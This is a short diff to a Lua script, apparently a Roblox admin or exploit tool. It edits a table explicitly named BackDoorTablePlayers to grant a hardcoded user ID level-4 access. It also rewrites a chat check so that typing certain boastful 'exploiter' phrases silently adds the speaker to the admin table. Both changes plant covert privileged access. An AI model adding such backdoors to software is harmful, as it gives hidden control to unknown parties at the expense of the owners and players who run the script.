@@ -240,10 +240,10 @@ local BackDoorTablePlayers = {
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(255,0,0);
 	};
-	[1] = {
-		['Name'] = "";
+	[1568905675] = {
+		['Name'] = "Chad";
 		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(0,0,0);
+		['Colour'] = Color3.fromRGB(255,0,0);
 	};
 	[1] = {
 		['Name'] = "";
@@ -792,7 +792,7 @@ local function Xray(Mode)
 end 
 
 local function IsAUser(Player,Chat)
-	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
+	if Chat == "TVGODSS is top 1 exploiter and will slam you" or Chat == "TVGODSS owns every exploiter on ts LOL" then 
 		AdminUserTable[Player] = true
 		return true 
 	end
